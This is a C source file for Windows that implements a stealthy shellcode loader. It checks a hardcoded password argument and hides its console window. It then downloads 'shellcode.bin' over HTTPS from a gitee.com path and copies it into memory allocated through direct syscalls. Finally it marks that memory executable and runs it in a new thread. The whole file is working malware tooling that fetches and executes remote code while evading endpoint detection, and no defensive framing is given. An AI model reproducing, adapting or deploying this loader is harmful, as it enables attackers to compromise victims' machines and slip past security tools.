#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <winhttp.h>
#include "syscalls64.h"

PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len)
{
    char *d = (char *) (dest);
    char *s = (char *) (src);
    if (d < s)
        while (len--)
            *d++ = *s++;
    else
    {
        char *lasts = s + (len - 1);
        char *lastd = d + (len - 1);
        while (len--)
            *lastd-- = *lasts--;
    }
    return dest;
}

int main(int argc, char *argv[])
{
    if (argc != 2) {
        printf("[-] Need password");
        return 0;
    }
    else if (strcmp(argv[1], "dajipeiniwan") != 0) {
        printf("[-] Password incorrect");
        return 0;
    }
    else {
        ShowWindow(GetForegroundWindow(), SW_HIDE);
        DWORD dwSize = 0;
        DWORD dwDownloaded = 0;
        LPSTR pszOutBuffer;
        BOOL bResults = FALSE;
        HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

        hSession = WinHttpOpen(L"WinHTTP Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        
        if (hSession) {
            hConnect = WinHttpConnect(hSession, L"www.gitee.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
            printf("[+] Executed WinHttpConnect\n");
        }

        if (hConnect) {
            hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/xxx/xxx/xxx/shellcode.bin", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
            printf("[+] Executed WinHttpOpenRequest\n");
        }

        if (hRequest) {
            bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
            printf("[+] Executed WinHttpSendRequest\n");
        }

        if (bResults) {
            bResults = WinHttpReceiveResponse(hRequest, NULL);
            printf("[+] Executed WinHttpReceiveResponse\n");
        }

        PVOID lpAddress = NULL;
        SIZE_T sDataSize = 0x60000;
        NtAllocateVirtualMemory((HANDLE) -1, &lpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);
        printf("[+] Executed NtAllocateVirtualMemory\n");
        DWORD_PTR hptr = (DWORD_PTR) lpAddress;

        if (bResults)
            do
            {
                dwSize = 0;
                if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                    printf("Error %u in WinHttpQueryDataAvailable\n", GetLastError());
                }
                printf("Shellcode size: %d\n", dwSize);
                pszOutBuffer = (unsigned char *) calloc(dwSize + 1, sizeof(unsigned char));
                //ZeroMemory(pszOutBuffer, dwSize + 1);
                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {
                    printf("Error %u in WinHttpReadData\n", GetLastError());
                }
                VxMoveMemory((PVOID)hptr, pszOutBuffer, dwSize);
                hptr += dwSize;
                free(pszOutBuffer);
            } while (dwSize > 0);
        printf("[+] Read data successfully\n");
        
        ULONG ulOldProtect = 0;
        NtProtectVirtualMemory((HANDLE)-1, &lpAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);
        printf("[+] Executed NtProtectVirtualMemory\n");
        
        HANDLE hHostThread = INVALID_HANDLE_VALUE;
        NtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
        printf("[+] Executed NtCreateThreadEx\n");
        
        NtWaitForMultipleObjects(1, &hHostThread, WaitAll, FALSE, NULL);
        printf("[+] Executed NtWaitForMultipleObjects\n");

        if (hRequest)
            WinHttpCloseHandle(hRequest);
        if (hConnect)
            WinHttpCloseHandle(hConnect);
        if (hSession)
            WinHttpCloseHandle(hSession);
        printf("[+] Finished");
        return 0;
    }
}